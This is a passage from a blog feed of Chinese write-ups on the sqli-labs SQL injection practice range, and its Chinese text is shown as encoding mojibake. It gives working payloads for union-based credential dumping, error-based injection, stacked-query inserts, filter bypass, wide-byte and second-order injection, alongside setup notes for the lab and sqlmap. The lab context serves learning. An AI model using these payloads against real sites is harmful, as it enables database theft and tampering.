alt="23"></p><p>ä¸å†èµ˜è¿°ã€‚</p><h1>Less-33</h1><p>å•å¼•å·ä»å‡ºç°è½¬ä¹‰ï¼ŒæŸ¥çœ‹æºç ï¼š</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/24.jpg" alt="24"></p><p>è¿™ä¸€å…³ä½¿ç”¨çš„æ˜¯addslashes()å‡½æ•°è¿‡æ»¤ã€‚</p><p>addslashes()ï¼šè¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ç”¨äºä¸ºå­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„å­—ç¬¦ä¸²ä»¥åŠæ•°æ®åº“æŸ¥è¯¢è¯­å¥å‡†å¤‡å­—ç¬¦ä¸²ã€‚<strong>PHP å¯¹æ‰€æœ‰çš„ GETã€POST å’Œ COOKIE æ•°æ®è‡ªåŠ¨è¿è¡Œ addslashes()ã€‚å› æ­¤ä¸åº”å¯¹å·²è½¬ä¹‰è¿‡çš„å­—ç¬¦ä¸²ä½¿ç”¨  addslashes()ï¼Œè¿™æ ·ä¼šå¯¼è‡´åŒå±‚è½¬ä¹‰</strong></p><p>é¢„å®šä¹‰å­—ç¬¦æ˜¯ï¼š</p><ul><li>å•å¼•å·ï¼ˆ'ï¼‰</li><li>åŒå¼•å·ï¼ˆ&quot;ï¼‰</li><li>åæ–œæ ï¼ˆ\ï¼‰</li><li>NULL</li></ul><h1>Less-34</h1><p>ç™»å½•ï¼š</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/25.jpg" alt="25"></p><p>è¿˜æ˜¯å­˜åœ¨è½¬ä¹‰ï¼Œä¹‹å‰çš„å…³å¡æ˜¯getå‹çš„æ–¹å¼ä»¥urlå½¢å¼æäº¤çš„ï¼Œå› æ­¤æ•°æ®ä¼šé€šè¿‡URLencodeï¼Œè€Œç°åœ¨æ˜¯postå‹ã€‚</p><h3 id="æ³•ä¸€-v2"><a class="header-anchor" href="#æ³•ä¸€-v2">ğŸ­</a>æ³•ä¸€</h3><p>ä»‹ç»ä¸€ä¸ªæ–°çŸ¥è¯†(è¯¦ç»†æ•™ç¨‹ï¼š<a href="https://blog.csdn.net/guxiaonuan/article/details/78678043">å­—ç¬¦ç¼–ç çš„æ¦‚å¿µ</a>)</p><p>Unicode å¯ä»¥ä½¿ç”¨çš„ç¼–ç æœ‰ä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><ul><li>UFT-8ï¼šä¸€ç§å˜é•¿çš„ç¼–ç æ–¹æ¡ˆï¼Œä½¿ç”¨ 1~6 ä¸ªå­—èŠ‚æ¥å­˜å‚¨ï¼›</li><li>UFT-32ï¼šä¸€ç§å›ºå®šé•¿åº¦çš„ç¼–ç æ–¹æ¡ˆï¼Œä¸ç®¡å­—ç¬¦ç¼–å·å¤§å°ï¼Œå§‹ç»ˆä½¿ç”¨ 4 ä¸ªå­—èŠ‚æ¥å­˜å‚¨ï¼›</li><li>UTF-16ï¼šä»‹äº UTF-8 å’Œ UTF-32 ä¹‹é—´ï¼Œä½¿ç”¨ 2 ä¸ªæˆ–è€… 4 ä¸ªå­—èŠ‚æ¥å­˜å‚¨ï¼Œé•¿åº¦æ—¢å›ºå®šåˆå¯å˜ã€‚</li></ul><p>å°†utf-8è½¬æ¢ä¸ºutf-16æˆ– utf-32ï¼Œä¾‹å¦‚å°† â€™ è½¬ä¸ºutf-16ä¸º ï¿½â€™ã€‚</p><h4 id="unionè”åˆæ³¨å…¥"><a class="header-anchor" href="#unionè”åˆæ³¨å…¥">ğŸ­</a>unionè”åˆæ³¨å…¥</h4><p>ç™»å½•å¦‚ä¸‹ï¼š</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/26.jpg" alt="26"></p><p>æŸ¥åº“ï¼š</p><img src="/2020/12/14/sqli-labs%E5%85%AD/27.jpg" alt="27" style="zoom:50%;"><h4 id="æŠ¥é”™æ³¨å…¥"><a class="header-anchor" href="#æŠ¥é”™æ³¨å…¥">ğŸ­</a>æŠ¥é”™æ³¨å…¥</h4><p><img src="/2020/12/14/sqli-labs%E5%85%AD/28.jpg" alt="28"></p><h3 id="æ³•äºŒ-v2"><a class="header-anchor" href="#æ³•äºŒ-v2">ğŸ­</a>æ³•äºŒ</h3><h4 id="æŠ“åŒ…"><a class="header-anchor" href="#æŠ“åŒ…">ğŸ­</a>æŠ“åŒ…</h4><p>åœ¨ç«ç‹æ•ˆä»¿å‰å‡ å…³ç”¨%dfâ€™å®½å­—èŠ‚æ³¨å…¥ï¼š<code>uname=-1%df' &amp;passwd=123&amp;submit=Submit</code>å‘ç°ä¸è¡Œï¼Ÿï¼Ÿ</p><p>æŠ“ä¸ªåŒ…:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/30.jpg" alt="30"></p><p>å‘ç°å¥‡å¥‡æ€ªæ€ªçš„è½¬ä¹‰ï¼Œæ‰€ä»¥åªèƒ½åœ¨burp suiteæ›´æ”¹ï¼š</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/29.jpg" alt="29"></p><h1>Less-35</h1><p>è¿™å…³æœ‰ç‚¹å¥‡æ€ªï¼Œæ•°å­—å‹æ³¨å…¥è¿˜å¯¹<code>'</code>è½¬ä¹‰ï¼Ÿï¼Ÿï¼ŸæŒ‰ç…§æµç¨‹æ­£å¸¸æ³¨å…¥å³å¯ï¼ŒåæœŸé‡åˆ°<code>'security'</code>åœ¨è¿›è¡Œç¼–ç å³å¯ã€‚</p><h1>Less-36</h1><p>getå®½å­—èŠ‚æ³¨å…¥ï¼Œæ¢äº†ä¸ªå‡½æ•°:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/31.jpg" alt="31"></p><p>å¯¹ä»¥ä¸‹å­—ç¬¦è½¬ä¹‰:</p><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>\x00<span class="hljs-bullet">- </span>\n<span class="hljs-bullet">- </span>\r<span class="hljs-bullet">- </span>\<span class="hljs-bullet">- </span><span class="hljs-emphasis">&#x27;</span><span class="hljs-emphasis">- &quot;</span><span class="hljs-emphasis">- \x1a</span></code></pre><p>è·Ÿä¹‹å‰ä¸€æ ·:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/32.jpg" alt="32"></p><p>or</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/33.jpg" alt="33"></p><p>ç«ç‹å¥½åƒå¯¹<code>%df'</code>æœ‰æ¶æ„ï¼Œæ‰§è¡Œä¼šæŠ¥é”™ï¼Œä»¥ä¸Šæ˜¯ç”¨Microsoft Edgeæ‰§è¡Œçš„ã€‚</p><h1>Less-37</h1><p>æœ¬å…³ä¸ 34 å…³æ˜¯å¤§è‡´ç›¸ä¼¼çš„,postå®½å­—èŠ‚æ³¨å…¥ï¼ŒåŒºåˆ«åœ¨äºå¤„ç† post å†…å®¹ç”¨çš„æ˜¯ mysql_real_escape_string()<br>å‡½æ•°ï¼Œè€Œä¸æ˜¯ addslashes()å‡½æ•°ï¼Œä½†æ˜¯åŸç†æ˜¯ä¸€æ ·çš„ï¼Œ</p><h1>Less-38</h1><h4 id="Stacked-injection"><a class="header-anchor" href="#Stacked-injection">ğŸ­</a>Stacked injection</h4><p>å¤šæ¡sqlè¯­å¥ä¸€èµ·æ‰§è¡Œï¼Œå’Œunionè¯­å¥æœ‰ç‚¹åƒï¼Œä½†æ˜¯union æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ï¼Œä½†å¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ã€‚åœ¨webç³»ç»Ÿä¸­ï¼Œä»£ç åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥ï¼Œåœ¨å‰ç«¯ç•Œé¢æ— æ³•çœ‹åˆ°è¿”å›ç»“æœã€‚</p><p>æºä»£ç ï¼š</p><img src="/2020/12/14/sqli-labs%E5%85%AD/34.jpg" alt="34" style="zoom: 80%;"><p>å‘ç°å¤šä¸ªå‡½æ•°:<a href="https://link.jianshu.com?t=http%3A%2F%2Fwww.runoob.com%2Fphp%2Ffunc-mysqli-more-results.html">PHP mysqli_more_results() å‡½æ•°</a> <a href="https://link.jianshu.com?t=http%3A%2F%2Fwww.runoob.com%2Fphp%2Ffunc-mysqli-multi-query.html">PHP mysqli_multi_query() å‡½æ•°</a> <a href="https://link.jianshu.com?t=http%3A%2F%2Fphp.net%2Fmanual%2Fzh%2Fmysqli.store-result.php">mysqli_store_result</a>ï¼Œç»æŸ¥è¯¢å‡ä¸è¿æ¥æ•°æ®åº“æœ‰å…³ã€‚</p><p>è¯•æ¢ä¸ºå•å¼•å·ï¼Œè¿›è¡Œæ’å…¥ï¼š<code>id=1';insert into users(id,username,password) values (38,'111','222')--+</code></p><p>æŸ¥è¯¢æ•°æ®åº“ï¼š</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/35.jpg" alt="35"></p><p>æˆåŠŸæ’å…¥ã€‚</p><h1>Less-39</h1><p>è¯•æ¢ä¸ºæ•°å­—å‹æ³¨å…¥ï¼Œä¸€æ ·çš„æ“ä½œ</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/36.jpg" alt="36"></p><p>40,41å…³ä¹Ÿä¸€æ ·ï¼Œå°‘äº†å›æ˜¾,ä¸èµ˜è¿°ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labsäº”</title>
    <link href="/2020/12/09/sqli-labs%E4%BA%94/"/>
    <url>/2020/12/09/sqli-labs%E4%BA%94/</url>
    
    <content type="html"><![CDATA[<h1>Less-23</h1><p>æœ¬å…³è·Ÿç¬¬ä¸€å…³æœ‰ç‚¹åƒï¼Œä½†æ˜¯è¯•æ¢è¿‡ç¨‹ä¸­å‘ç°<code>id=1'</code>å’Œ<code>id=')</code>æŠ¥é”™ï¼Œä½†æ³¨é‡Šåä»æŠ¥é”™ï¼Œè€Œ<code>id=1&quot;</code>å’Œ<code>id=1&quot;)</code>å›æ˜¾æ­£å¸¸ï¼Œçœ‹ä¸€ä¸‹æºä»£ç </p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/1.jpg" alt="1"></p><p>å‘ç°æœ¬å…³å¯¹â€“+å’Œ#éƒ½è¿›è¡Œäº†è½¬ä¹‰ï¼Œæ•…ä¸èƒ½å†ç”¨è¿™ç§æ–¹å¼æ³¨é‡Šï¼Œå¯ä»¥åœ¨ä¹‹åæ„é€ å‡ºé—­åˆç”¨;%00(ä¸€ç§ç‰¹æ®Šçš„æ³¨é‡Šç¬¦)æˆ–è€…andå’Œorè¯­å¥è¿›è¡Œé—­åˆã€‚é€šè¿‡è¯•æ¢å¾—å‡ºè¯¥å¤„ä¸ºå•å¼•å·æ³¨å…¥ï¼š</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/2.jpg" alt="2"></p><p>å…¶ä½™æ­¥éª¤ä¸ç¬¬ä¸€å…³ç›¸ä¼¼ï¼Œåœ¨æ¯æ¡è¯­å¥åé¢åŠ ä¸Š<code>and'1'='1</code>é—­åˆå³å¯ã€‚</p><h1>Less-24ï¼ˆäºŒæ¬¡æ³¨å…¥ï¼‰</h1><p>äºŒæ¬¡æ³¨å…¥æ€è·¯ï¼š</p><ul><li>å…ˆæ„é€ è¯­å¥ï¼ˆæœ‰è¢«è½¬ä¹‰å­—ç¬¦çš„è¯­å¥æˆ–SQLè¯­å¥ï¼‰æäº¤ HTTP æ•°æ®è¯·æ±‚åˆ°æœåŠ¡ ç«¯è¿›è¡Œå¤„ç†</li><li>æœåŠ¡ç«¯ä¿å­˜æ•°æ®ï¼Œä¸ºåº”ç”¨ç¨‹åºæä¾›åŸå§‹è¾“å…¥æ•°æ®å¹¶å“åº”å®¢æˆ·ç«¯è¯·æ±‚</li><li>å‘æœåŠ¡ç«¯å‘é€ç¬¬äºŒä¸ªä¸ç¬¬ä¸€æ¬¡ä¸ç›¸åŒçš„è¯·æ±‚æ•°æ®ä¿¡æ¯</li><li>æœåŠ¡ç«¯æ¥æ”¶åˆ°è¯·æ±‚ï¼ŒæŸ¥è¯¢æ•°æ®åº“ä¸­å·²ç»å­˜å‚¨çš„æ•°æ®ä¿¡æ¯å¹¶å¤„ç†ï¼Œä»è€Œç¬¬ä¸€æ¬¡è¯·æ±‚ä¸­æ„é€ çš„è¯­å¥åœ¨æœåŠ¡ç«¯ç¯å¢ƒä¸­æ‰§è¡Œ</li><li>æœåŠ¡ç«¯è¿”å›æ‰§è¡Œçš„å¤„ç†ç»“æœæ•°æ®ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡è¿”å›çš„ç»“æœåˆ¤æ–­äºŒæ¬¡æ³¨å…¥æ¼æ´åˆ©ç”¨æ˜¯å¦æˆåŠŸ</li></ul><p>é¡µé¢ä¸­å‡ºç°Forgot your password?ç‚¹è¿›å»é¢â€¦å»æ”»å‡»å®ƒ???åªèƒ½ç‚¹New User click here?æ³¨å†Œã€‚</p><p>æŸ¥çœ‹login.phpæºä»£ç :</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/15.jpg" alt="15"></p><p>ç™»å½•æ—¶ç”¨æˆ·åå’Œå¯†ç éƒ½è¢«è¿‡æ»¤ã€‚</p><p>æŸ¥çœ‹login_create.phpæºä»£ç ï¼š</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/16.jpg" alt="16"></p><p>å¯æ’å…¥ç”¨æˆ·åå’Œå¯†ç </p><p>pass_change.phpæºä»£ç ï¼š</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/14.jpg" alt="14"></p><p>æ›´æ”¹å¯†ç æ—¶ï¼Œç”¨æˆ·åæ²¡æœ‰è¿‡æ»¤ï¼Œsqlè¯­å¥ä¸­å¯¹ç”¨æˆ·ååŠ äº†å•å¼•å·ã€‚</p><p>æ³¨å†Œç”¨æˆ·åä¸ºadminâ€™#å¯†ç éšæ„ï¼š</p><img src="/2020/12/09/sqli-labs%E4%BA%94/17.jpg" alt="17" style="zoom: 50%;"><p>ä¿®æ”¹å¯†ç åä½¿ç”¨æ–°å¯†ç é‡æ–°ç™»å½•ï¼Œå‘ç°æ— æ³•ç™»å½•ï¼ŒæŸ¥çœ‹æ•°æ®åº“</p><img src="/2020/12/09/sqli-labs%E4%BA%94/18.jpg" alt="18" style="zoom:80%;"><p>å‘ç°adminçš„å¯†ç å˜æˆäº†æ–°å¯†ç ï¼Œè€ŒåŸæœ¬æ³¨å†Œçš„ç”¨æˆ·å¯†ç ä¸å˜ï¼Œå› ä¸ºåœ¨åˆ›å»ºadminâ€˜#ä¹‹åï¼Œè¿™ä¸ªè´¦å·å†æ¬¡æ£€ç´¢çš„æ—¶å€™ä¸ç”¨è¿›è¡Œè½¬ä¹‰æ£€æµ‹ï¼Œæ‰€ä»¥æœç´¢åˆ°çš„æ•°æ®åº“åæ—¶adminï¼Œå¹¶ä¸æ˜¯adminâ€™#ï¼Œæ‰€ä»¥ä¿®æ”¹çš„å¯†ç ä¹Ÿæ˜¯adminçš„å¯†ç ï¼Œæ‰€ä»¥ç™»å½•çš„æ—¶å€™ï¼Œusernameåº”è¯¥æ˜¯adminï¼Œè€Œä¸æ˜¯adminâ€˜#ã€‚</p><h1>Less-25(ç»•è¿‡æ³¨å…¥)</h1><p>æ­£å¸¸ç™»å½•åï¼Œå¼€å§‹æµ‹è¯•ï¼ŒåŠ ä¸Šå•å¼•å·ï¼ŒæŠ¥é”™ï¼Œæ³¨é‡Šæ‰å›æ˜¾æ­£å¸¸ï¼Œæ•…ä¸ºå•å¼•å·æ³¨å…¥ï¼Œæ¥ä¸‹æ¥<code>orser by 3 --+</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/4.jpg" alt="4"></p><p>å‘ç°å›æ˜¾ä¸æ­£å¸¸ï¼Œhintæç¤ºæˆ‘ä»¬è¯­å¥ä¸­çš„orä¸¤ä¸ªå­—æ¯æ²¡æœ‰äº†,æŸ¥ä¸€ä¸‹æºä»£ç ï¼š</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/5.jpg" alt="5"></p><p>or å’Œandè¢«æ³¨é‡Šæ‰äº†ã€‚</p><h2 id="æ³•ä¸€ï¼šåŒå†™çš„è”åˆæŸ¥è¯¢"><a class="header-anchor" href="#æ³•ä¸€ï¼šåŒå†™çš„è”åˆæŸ¥è¯¢">ğŸ­</a>æ³•ä¸€ï¼šåŒå†™çš„è”åˆæŸ¥è¯¢</h2><p>ä½¿ç”¨åŒå†™çš„æ–¹æ³•ï¼ŒæŠŠorå’Œandçš„æ¯ä¸€ä¸ªå­—æ¯ä¹‹é—´ï¼Œä½¿ç”¨oræˆ–andåˆ†éš”å¼€å³å¯:</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/6.jpg" alt="6"></p><p>åç»­å’Œç¬¬ä¸€å…³ä¸€æ ·ï¼Œåœ¨é‡åˆ°orå’Œandæ—¶è¦åŒå†™ã€‚å¦‚ä¸‹éœ€å¯¹passwordè¿›è¡ŒåŒå†™<code>?id=-1' union select 1,(select group_concat(concat_ws('-',id,username,passwoorrd)) from users),3-- #</code>:</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/7.jpg" alt="7"></p><h2 id="æ³•äºŒï¼šæŠ¥é”™æ³¨å…¥or"><a class="header-anchor" href="#æ³•äºŒï¼šæŠ¥é”™æ³¨å…¥or">ğŸ­</a>æ³•äºŒï¼šæŠ¥é”™æ³¨å…¥<code>or-&gt;||</code></h2><p><code>?id=1' || extractvalue(1,concat(0x7e,database()))--+</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/8.jpg" alt="8"></p><p>å‘ç°orå¯ä»¥ç”¨||ä»£æ›¿è€Œandç”¨&amp;&amp;ä»£æ›¿æŠ¥é”™ã€‚åŸå› æ˜¯&amp;&amp;è¿›è¡Œurlç¼–ç ï¼Œå˜æˆäº†%26%26ï¼š</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/9.jpg" alt="9"></p><h1>Less-25a</h1><p>æœ¬å…³å¯ä»¥æ­£å¸¸unionæ³¨å…¥ä¹Ÿå¯ä»¥ç”¨Boolæˆ–Timeç›²æ³¨ï¼Œä½†ä¸èƒ½æŠ¥é”™æ³¨å…¥ï¼š<img src="/2020/12/09/sqli-labs%E4%BA%94/10.jpg" alt="10"></p><p>æºä»£ç ä¸­å°†æŠ¥é”™æ³¨é‡Šæ‰äº†ã€‚</p><p>è¯•æ¢ä¸€ç•ªå‘ç°ä¸ºæ•°å­—å‹è¾“å…¥ï¼Œå…¶ä½™æ­¥éª¤ä¸25å…³ç›¸ä¼¼ã€‚</p><h1>Less-26</h1><p>å•å¼•å·æŠ¥é”™ï¼Œå°†å…¶æ³¨é‡Šåä»æŠ¥é”™ï¼Œå‘ç°æ³¨é‡Šç¬¦æ¶ˆå¤±</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/11.jpg" alt="11"></p><p>æŸ¥çœ‹æºä»£ç :</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/12.jpg" alt="12"></p><p>å‘ç°ä¸€å †ç¬¦å·è¢«æ³¨é‡Šäº†ï¼Œæ‰€ä»¥è¦åƒç»™oræ‰¾ä¸ªæ›¿ä»£ç¬¦å·ä¸€æ ·ï¼Œç»™å…¶ä»–çš„è¢«è½¬ä¹‰çš„ç¬¦å·æ‰¾ä¸ªæ›¿ä»£ï¼š</p><ul><li><p><code>;%00</code>æ³¨é‡Šç¬¦</p></li><li><p><code>%0a</code> æ–°å»ºä¸€è¡Œ</p></li><li><p><code>%0b</code> TAB é”®ï¼ˆå‚ç›´ï¼‰</p></li><li><p><code>%0c</code> æ–°çš„ä¸€é¡µ</p></li><li><p><code>%0d</code> return åŠŸèƒ½</p></li><li><p><code>%a0</code> ç©ºæ ¼</p></li><li><p><code>%09</code> TAB é”®ï¼ˆæ°´å¹³ï¼‰</p><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">23</span><span class="hljs-comment">(#)</span>`ã€`<span class="hljs-meta">%</span><span class="hljs-number">2</span>a<span class="hljs-comment">(*)</span>`ã€`<span class="hljs-meta">%</span><span class="hljs-number">2</span>d<span class="hljs-comment">(-)</span>`ã€`<span class="hljs-meta">%</span><span class="hljs-number">2</span>f<span class="hljs-comment">(/)</span>`ã€`<span class="hljs-meta">%</span><span class="hljs-number">5</span>c<span class="hljs-comment">(\)</span></code></pre></li></ul><p>æœ‰ä¸‰ç§æ³¨å…¥æ–¹å¼ï¼š</p><ul><li><p>å› æ­£ç¡®å›æ˜¾éå›ºå®šå­—ç¬¦ä¸²ï¼Œå¯åˆ©ç”¨ä»¥ä¸Šç‰¹æ®Š URL ç¼–ç ä»£æ›¿ç©ºæ ¼ï¼Œä»ä½¿ç”¨<code>union</code>åŠ ç©ºæ ¼è¿æ¥<code>select</code>è”åˆæ³¨å…¥ã€‚</p><p>å°†å•å¼•å·æ³¨é‡Šæ‰:<code>?id=0%27%a0||%a0%271%27=%271</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/20.jpg" alt="20"></p><p>å›æ˜¾æ­£å¸¸ï¼Œæ•…ä¸ºå•å¼•å·æ³¨å…¥</p><p><code>?id=0'%a0union%a0select%a02,database(),4%a0||%a0'1'='1</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/19.jpg" alt="19"></p><p>æ¥ä¸‹å»å’Œä¹‹å‰ç±»ä¼¼ï¼Œæ³¨æ„å­—ç¬¦è½¬æ¢ã€‚</p></li><li><p>updatexml()ä¸extractvalue()æŠ¥é”™æ³¨å…¥</p><p><code>?id=0'||updatexml(1,concat('$',(database())),0)||'1'='1</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/21.jpg" alt="21"></p><p>æ¥ä¸‹å»åŒç†ã€‚</p></li><li><p>Bool ç›²æ³¨ï¼Œæ„é€ æ³¨å…¥è¯­å¥é¿å¼€ç©ºæ ¼ã€‚</p></li></ul><h1>Less-26a</h1><p><code>?id=1'</code>æ— å›æ˜¾ï¼ŒåŒå¼•å·å›æ˜¾æ­£å¸¸æŸ¥çœ‹æºä»£ç ï¼š</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/22.jpg" alt="22"></p><p>å›¾ä¸­48è¡Œå°†æŠ¥é”™æ³¨é‡Šæ‰ï¼Œæ•…æ­¤å…³ä¸èƒ½ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œor,andç­‰ç¬¦å·ä¸€æ ·è¢«æ³¨é‡Šæ‰äº†ã€‚å°†å•å¼•å·æ³¨é‡Šæ‰ä»æ— å›æ˜¾ï¼Œç”¨<code>?id=1')||'1'=('1</code>è¿›è¡Œæ³¨é‡Šå›æ˜¾æ­£å¸¸æ•…ä¸ºâ€˜ï¼‰é—­åˆå‹æ³¨å…¥ã€‚</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/23.jpg" alt="23"></p><p>å…¶ä½™æ­¥éª¤ä¸26å…³ç±»ä¼¼<strong>ä½†ä¸å¯ç”¨æŠ¥é”™æ³¨å…¥</strong>ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>less-24ç™»å½•æŠ¥é”™è§£å†³æ–¹æ³•</title>
    <link href="/2020/12/06/24/"/>
    <url>/2020/12/06/24/</url>
    
    <content type="html"><![CDATA[<p>åäºŒæœˆä¸€å·çš„æ—¶å€™æ‰“é¶åœºæ‰“åˆ°ç¬¬24å…³ï¼ŒæŒ‰æ­£å¸¸æ­¥éª¤å…ˆè¿›è¡Œæ³¨å†Œåé¡µé¢å¦‚ä¸‹ï¼š</p><p><img src="/2020/12/06/24/2.jpg" alt="2"></p><p>æ— æ³•è·³è½¬åˆ°åˆå§‹ç™»å½•é¡µé¢ï¼Œä¸”å‡ºç°è­¦å‘Šï¼Œç„¶åæˆ‘ä»¥ä¸ºè¿™åªæ˜¯æ­£å¸¸è­¦å‘Šå°±æ‰‹åŠ¨ç‚¹å‡»homeé”®è¿”å›</p><p>ç”¨åˆšæ³¨å†Œçš„è´¦å·ç™»å½•å‡ºç°å¦‚ä¸‹é¡µé¢:</p><p><img src="/2020/12/06/24/1.jpg" alt="1"></p><p>æ— æ³•æ­£å¸¸ç™»å½•ï¼Œç„¶åæˆ‘æ ¹æ®è­¦å‘Šå†…å®¹æŸ¥çœ‹äº†login.phpæ–‡ä»¶ï¼ŒæŸ¥ä¸å‡ºä»€ä¹ˆé”™è¯¯ã€‚ä¹‹åå°±å»ç™¾åº¦ï¼Œæœåˆ°ä¸¤ç§è§£æ³•ï¼Œç¬¬ä¸€ç§æ˜¯logged-inæ–‡ä»¶æœ‰é”™è¯¯ï¼Œæˆ‘é‡æ–°ä¸‹äº†sqli-labsçš„å‹ç¼©åŒ…æ›¿æ¢ï¼Œç»“æœä¸€æ ·â€¦ç¬¬äºŒç§æ˜¯ä¿®æ”¹php.iniæ–‡ä»¶é‡Œçš„output_buffering = Offï¼Œå°†Offæ”¹ä¸ºOnï¼›å°†session.auto_start = 0 æ”¹ä¸ºsession.auto_start = 1 ã€‚æ”¹å®Œåéœ€è¦é‡å¯apacheï¼Œæˆ‘æŒ‰ç…§è¿™ä¸ªæ–¹æ³•æ”¹äº†å¦‚ä¸‹æ–‡ä»¶é‡Œçš„é…ç½®</p><p><img src="/2020/12/06/24/3.jpg" alt="3"></p><p>å‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œä¾æ—§æ˜¯é‚£ä¸ªé¡µé¢ï¼Œç„¶åæˆ‘å°±å¡åœ¨24å…³åˆ°ä»Šå¤©ï¼Œå¡äº†å¿«ä¸€å‘¨â€¦</p><p>å°±åœ¨ä»Šå¤©ï¼Œæˆ‘å‘ç°äº†å¦ä¸€ä¸ªæ–‡ä»¶:</p><p><img src="/2020/12/06/24/4.jpg" alt="4"></p><p>è¿™ä¸ªæ–‡ä»¶çš„ç±»å‹ä¸ºè®¾ç½®é…ç½®ï¼ï¼ï¼æˆ‘æ”¹äº†è¿™ä¸ªæ–‡ä»¶çš„ç›¸å…³å‚æ•°ï¼Œå†æ¬¡ç™»å½•å‘ç°æˆåŠŸç™»å½•äº†!!</p><p><img src="/2020/12/06/24/17.jpg" alt="17"></p><p>æ‰€ä»¥åªéœ€åœ¨æ­¤æ–‡ä»¶é‡Œæ”¹ä¿¡æ¯â€¦å› ä¸ºç™»å½•é—®é¢˜å¡äº†å¿«ä¸€å‘¨çš„ä¸œè¥¿å°±è¿™ä¹ˆè§£å†³äº†ã€‚ã€‚</p><p>è‡³äºä¸ºä»€ä¹ˆè¿™ä¹ˆåšæŸ¥åˆ°çš„è§£é‡Šæ˜¯ï¼šç”¨txtæ–‡ä»¶ç¼–è¾‘è¿‡function.phpã€wp-login.phpã€pluggable.php è¿™ä¸‰ä¸ªPHPæ–‡ä»¶å¯¼è‡´UTF8ç¼–ç å’ŒBOMå†²çªï¼ŒUTF8æ–‡ä»¶çš„BOMï¼ˆByte Order Mark)æ ‡å¿—ï¼Œåœ¨ä¿å­˜çš„æ—¶å€™ä¼šè‡ªåŠ¨å­˜å…¥ï¼</p><p>ç„¶åé—®é¢˜å°±è§£å†³äº†~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2020/12/01/sqlmap/"/>
    <url>/2020/12/01/sqlmap/</url>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">ğŸ­</a>å‰è¨€</h4><p>sqlmapç»ˆäºç»ˆäºæ­å¥½äº†ï¼Œä¹‹å‰çš„pythonç¯å¢ƒæ²¡æ­å¥½ï¼Œä¸‹äº†å¥½å¤šæ¬¡æ¢è¿‡2.Xå’Œ3.Xï¼Œè®¾ç½®ç¯å¢ƒå˜é‡çš„æ—¶å€™è¿˜ä¸å°å¿ƒå°†pathå˜é‡åˆ äº†å¯¼è‡´åšå®¢å´©äº†â€¦ä¹‹åsqlmapè§£å‹é”™æ ¹ç›®å½•äº†â€¦ç»ˆäºæŠŠsqlmapæ­å¥½äº†æƒ³æ‰“é¶åœºï¼Œå‘ç°è¿˜éœ€è¦æœ‰æŠ“åŒ…å·¥å…·ï¼Œäºæ˜¯åˆå»æ­javaç¯å¢ƒ,ä¸‹Burp Suiteã€‚ç°åœ¨ç»ˆäºå¯ä»¥äº†!!!</p><h1>Sqlmapç®€ä»‹</h1><p>äº”ç§æ³¨å…¥æ¨¡å¼ï¼šå¸ƒå°”ç›²æ³¨ï¼Œæ—¶é—´ç›²æ³¨ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œè”åˆæŸ¥è¯¢ï¼Œå †æŸ¥è¯¢</p><p>æ”¯æŒçš„æ•°æ®åº“ï¼šMySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybaseå’ŒSAP MaxDB</p><p>ä¸ƒç§ç­‰çº§:</p><ul><li>0 